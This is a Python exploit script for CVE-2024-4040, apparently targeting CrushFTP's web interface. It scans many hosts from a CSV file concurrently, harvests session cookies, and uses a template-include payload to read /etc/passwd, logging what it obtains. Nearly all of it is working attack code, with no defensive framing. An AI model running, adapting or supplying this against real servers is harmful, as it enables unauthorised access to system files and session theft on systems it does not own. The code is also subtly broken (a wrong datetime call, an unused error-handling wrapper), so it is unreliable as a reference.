import argparse
import asyncio
import csv
import datetime
import logging
from urllib.parse import urlunparse

import aiofiles
import httpx
from faker import Faker

FAKE = Faker()

HEADERS = {
    "User-Agent": FAKE.user_agent()
}

TIMEOUT = 12.0

def setup_loggers():
    message_logger = logging.getLogger("message")
    message_logger.setLevel(logging.INFO)
    message_handler = logging.FileHandler(f"CVE-2024-4040-{datetime.now().strftime('%Y%m%d-%H%M%S')}.log")
    message_handler.setFormatter(logging.Formatter('%(message)s'))
    message_logger.addHandler(message_handler)

    cookies_logger = logging.getLogger("cookies")
    cookies_logger.setLevel(logging.INFO)
    cookies_handler = logging.FileHandler(f"cookies-{datetime.now().strftime('%Y%m%d-%H%M%S')}.log")
    cookies_handler.setFormatter(logging.Formatter('%(message)s'))
    cookies_logger.addHandler(cookies_handler)

    return message_logger, cookies_logger

MESSAGE_LOGGER, COOKIES_LOGGER = setup_loggers()


def fix_base_url(host: str, protocol: str, ip: str, domain: str, port, **kwargs):
    if "://" in host:
        protocol_split = host.split("://", 1)
        scheme = protocol_split[0]
        netloc = protocol_split[1]
    else:
        scheme = protocol
        netloc = host
    
    if ":" in netloc:
        netloc_split = netloc.split(":", 1)
        base_host = netloc_split[0]
        port_from_host = netloc_split[1]
    else:
        base_host = netloc
        port_from_host = port

    if base_host and port_from_host:
        return urlunparse((scheme, f"{base_host}:{port_from_host}", '', '', '', ''))
    
    final_netloc = f"{domain if domain else ip}:{port_from_host}"
    return urlunparse((scheme, final_netloc, '', '', '', ''))


async def async_read_csv(file_path, encoding="utf-8-sig"):
    async with aiofiles.open(file_path, mode='r', encoding=encoding) as file:
        header = next(csv.reader([await file.readline()]))
        async for line in file:
            row = next(csv.reader([line]))
            if len(row) != len(header):
                print(f"Error: Invalid row in CSV file: {row}")
                break
            yield dict(zip(header, row, strict=True))


def handle_exceptions(func):
    async def wrapper(*args, **kwargs):
        try:
            base_url, cookies, message = await func(*args, **kwargs)
            MESSAGE_LOGGER.info(message)
            COOKIES_LOGGER.info(f"{base_url}\t{cookies}")
        except httpx.RequestError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] RequestError: {e}")
        except httpx.TimeoutException as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] Request timed out")
        except httpx.HTTPStatusError as e:
            MESSAGE_LOGGER.error(f"[*] [{e.request.url}] HTTPStatusError: {e.response.status_code}")
        except Exception as e:
            MESSAGE_LOGGER.error(f"[*] Unhandled Exception: {e}")
        return None
    return wrapper


async def exploit(client: httpx.AsyncClient, target: dict | str):
    base_url = None
    if isinstance(target, str):
        base_url = target
    else:
        base_url = fix_base_url(**target)
    if base_url is None:
        raise ValueError("Invalid target")

    message = None

    crush_auth = None
    current_auth = None
    
    client.cookies = None
    response = await client.get(f"{base_url}/WebInterface/")
    if response.status_code == 404:
        message = f"[-] [{response.status_code}]\t[{base_url}] target exist\n{response.cookies}\n"
        crush_auth = response.cookies.get("CrushAuth")
        current_auth = response.cookies.get("currentAuth")
    else:
        message = f"[-] [{response.status_code}]\t[{base_url}] target not exist\n{response.cookies}\n"
    
    if crush_auth or current_auth:
        data = {
            "c2f": crush_auth if crush_auth else current_auth,
            "command": "zip",
            "path": r"<INCLUDE>/etc/passwd</INCLUDE>",
            "names": None
        }
        response = await client.get(f"{base_url}/WebInterface/function/", params=data)
        if response.status_code == 200 and "root" in response.text:
            message += f"[+] [{response.status_code}]\t[{base_url}] {response.text}\n"
        else:
            message += f"[-] [{response.status_code}]\t[{base_url}] {response.text}\n"

    return base_url, client.cookies, message

async def request_task(queue: asyncio.Queue):
    async with httpx.AsyncClient(headers=HEADERS, verify=False, timeout=TIMEOUT) as client:  # noqa: S501
        while True:
            target = await queue.get()
            if target:
                await exploit(client, target)
            queue.task_done()


async def task_manager(csv_file, task_num=200, queue_size=10000):
    queue = asyncio.Queue(queue_size)

    tasks = [asyncio.create_task(request_task(queue)) for _ in range(task_num)]

    async for target in async_read_csv(csv_file):
        await queue.put(target)
    
    await queue.join()
    await asyncio.sleep(TIMEOUT * 1.3)
    
    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)


async def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="URL of the target")
    group.add_argument("-f", "--file", help="Path to the target file")
    args = parser.parse_args()

    match args:
        case _ if args.file:
            await task_manager(args.file)
        case _ if args.url:
            async with httpx.AsyncClient(headers=HEADERS, verify=False, timeout=TIMEOUT) as client:  # noqa: S501
                await exploit(client, args.url)


if __name__ == "__main__":
    asyncio.run(main())